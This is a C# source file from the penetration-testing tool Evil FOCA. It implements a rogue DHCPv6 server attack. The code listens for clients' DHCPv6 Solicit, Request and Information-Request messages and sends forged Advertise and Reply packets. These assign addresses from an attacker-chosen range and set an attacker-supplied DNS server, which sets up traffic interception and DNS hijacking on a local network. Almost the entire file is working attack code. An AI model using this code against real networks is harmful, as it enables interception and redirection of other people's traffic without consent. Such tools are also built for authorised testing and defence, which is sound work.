/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.IO;
using System.Linq;
using System.Net;
using evilfoca.Data;
using evilfoca.DHCPv6;
using PacketDotNet;
using SharpPcap.WinPcap;
using System.Collections.Generic;

namespace evilfoca.Attacks
{
    // Este ataque es pasivo
    class DHCPIpv6
    {
        IList<Data.Attack> attacks;
        private WinPcapDevice device;
        byte IpID = 0x01;

        public DHCPIpv6(WinPcapDevice device, IList<Data.Attack> attacks)
        {
            this.device = device;
            this.attacks = attacks;
        }

        public bool CheckIfIsRequestDHCPIpv6(Packet p)
        {
            if (p.PayloadPacket == null || p.PayloadPacket.PayloadPacket == null)
                return false;
            if (!(p.PayloadPacket.PayloadPacket is UdpPacket) || !(p.PayloadPacket is IPv6Packet))
                return false;
            if ((p.PayloadPacket as IPv6Packet).SourceAddress.Equals(Program.CurrentProject.data.GetIPv6LocalLinkFromDevice(device)))
                return false;
            if ((p.PayloadPacket.PayloadPacket as UdpPacket).SourcePort == 546 && (p.PayloadPacket.PayloadPacket as UdpPacket).DestinationPort == 547)
                return true;
            return false;
        }

        unsafe public void AnalyzePacket(WinPcapDevice device, Packet p)
        {
            if (p.PayloadPacket == null || p.PayloadPacket.PayloadPacket == null || !(p.PayloadPacket.PayloadPacket is UdpPacket))
                return;
            UdpPacket udp = (UdpPacket)p.PayloadPacket.PayloadPacket;
            if (udp.ParentPacket == null)
                return;
            if (!(udp.ParentPacket is IPv6Packet))
                return;

            if (attacks.Where(A => A.attackType == AttackType.DHCPIpv6).Count() == 0)
                return;

            DhcpIPv6 attack = (DhcpIPv6)attacks.Where(A => A.attackType == AttackType.DHCPIpv6).First();


            IPv6Packet packetIpLayer = (IPv6Packet)udp.ParentPacket;
            EthernetPacket ethernet = (EthernetPacket)p;

            /*
            Info: http://en.wikipedia.org/wiki/DHCPv6
            Example
            In this example, the server's link-local address is fe80::0011:22ff:fe33:5566/64 and the client's link-local address is fe80::aabb:ccff:fedd:eeff/64.
            DHCPv6 client sends a Solicit from [fe80::aabb:ccff:fedd:eeff]:546 for [ff02::1:2]:547.
            DHCPv6 server replies with an Advertise from [fe80::0011:22ff:fe33:5566]:547 for [fe80::aabb:ccff:fedd:eeff]:546.
            DHCPv6 client replies with a Request from [fe80::aabb:ccff:fedd:eeff]:546 for [ff02::1:2]:547. (All client messages are sent to the multicast address, per section 13 of RFC 3315.)
            DHCPv6 server finishes with a Reply from [fe80::0011:22ff:fe33:5566]:547 for [fe80::aabb:ccff:fedd:eeff]:546.
            */
            DHCPv6Packet pa = new DHCPv6Packet();
            pa.ParsePacket(udp.PayloadData);

            if (packetIpLayer.DestinationAddress.Equals(IPAddress.Parse("ff02::1:2")))
            {
                EthernetPacket newPEthernet = new EthernetPacket(device.Interface.MacAddress,
                                                                        ethernet.SourceHwAddress,
                                                                         EthernetPacketType.IpV6);
                UdpPacket newUDP = null;
                IPAddress ipv6LocalLink = null;
                IPv6Packet newIpv6 = null;
                switch (pa.MessageType)
                {
                    case DHCPv6Type.Solicit:
                        if (pa.Options.ContainsKey(DHCPv6OptionCode.ClientIdentifier) && pa.Options.ContainsKey(DHCPv6OptionCode.IANA))
                        {
                            newUDP = new UdpPacket(547, 546);
                            byte[] iaid = pa.Options[DHCPv6OptionCode.IANA].Value;
                            pa.MessageType = DHCPv6Type.Advertise;
                            pa.Options.Remove(DHCPv6OptionCode.ElapsedTime);
                            pa.Options.Remove(DHCPv6OptionCode.FQDM);
                            pa.Options.Remove(DHCPv6OptionCode.VendorClass);
                            pa.Options.Remove(DHCPv6OptionCode.OptionRequest);
                            pa.Options.Remove(DHCPv6OptionCode.IANA);
                            pa.AddServerIdentifierOption(device.MacAddress);
                            pa.AddIANAOption(IPAddress.Parse(string.Format("{0}:{1}", attack.fakeIPRange.ToString().Substring(0, attack.fakeIPRange.ToString().LastIndexOf(':')), IpID)), iaid);
                            pa.AddDNSOption(attack.fakeDns);
                            pa.AddDomainSearchListOption(new string[] { "google.com" });
                            IpID++;
                            newUDP.PayloadData = pa.BuildPacket();

                            ipv6LocalLink = IPAddress.Parse(Program.CurrentProject.data.GetIPv6LocalLinkFromDevice(device).ToString());
                            newIpv6 = new IPv6Packet(ipv6LocalLink, packetIpLayer.SourceAddress);
                            newIpv6.HopLimit = 1;
                            newIpv6.PayloadPacket = newUDP;
                            newPEthernet.PayloadPacket = newIpv6;
                            newUDP.UpdateCalculatedValues();
                            newUDP.UpdateUDPChecksum();
                            Program.CurrentProject.data.SendPacket(newPEthernet);
                        }
                        break;
                    case DHCPv6Type.Request:
                        newUDP = new UdpPacket(547, 546);
                        pa.MessageType = DHCPv6Type.Reply;
                        pa.Options.Remove(DHCPv6OptionCode.ElapsedTime);
                        pa.Options.Remove(DHCPv6OptionCode.FQDM);
                        pa.Options.Remove(DHCPv6OptionCode.VendorClass);
                        pa.Options.Remove(DHCPv6OptionCode.OptionRequest);
                        pa.Options.Remove(DHCPv6OptionCode.DNS);

                        pa.AddDNSOption(attack.fakeDns);
                        pa.AddDomainSearchListOption(new string[] { "google.com" });
                        newUDP.PayloadData = pa.BuildPacket();

                        ipv6LocalLink = IPAddress.Parse(Program.CurrentProject.data.GetIPv6LocalLinkFromDevice(device).ToString());
                        newIpv6 = new IPv6Packet(ipv6LocalLink, packetIpLayer.SourceAddress);
                        newIpv6.HopLimit = 1;
                        newIpv6.PayloadPacket = newUDP;
                        newPEthernet.PayloadPacket = newIpv6;
                        newUDP.UpdateCalculatedValues();
                        newUDP.UpdateUDPChecksum();
                        Program.CurrentProject.data.SendPacket(newPEthernet);
                        break;
                    case DHCPv6Type.InformationRequest:
                        newUDP = new UdpPacket(547, 546);
                        pa.MessageType = DHCPv6Type.Reply;
                        pa.Options.Remove(DHCPv6OptionCode.ElapsedTime);
                        pa.Options.Remove(DHCPv6OptionCode.FQDM);
                        pa.Options.Remove(DHCPv6OptionCode.VendorClass);
                        pa.Options.Remove(DHCPv6OptionCode.OptionRequest);
                        pa.Options.Remove(DHCPv6OptionCode.IANA);
                        pa.AddServerIdentifierOption(device.MacAddress);
                        pa.AddDNSOption(attack.fakeDns);
                        pa.AddDomainSearchListOption(new string[] { "google.com" });
                        newUDP.PayloadData = pa.BuildPacket();

                        ipv6LocalLink = IPAddress.Parse(Program.CurrentProject.data.GetIPv6LocalLinkFromDevice(device).ToString());
                        newIpv6 = new IPv6Packet(ipv6LocalLink, packetIpLayer.SourceAddress);
                        newIpv6.HopLimit = 1;
                        newIpv6.PayloadPacket = newUDP;
                        newPEthernet.PayloadPacket = newIpv6;
                        newUDP.UpdateCalculatedValues();
                        newUDP.UpdateUDPChecksum();
                        Program.CurrentProject.data.SendPacket(newPEthernet);
                        break;
                    default:
                        break;
                }
            }
        }
    }
}
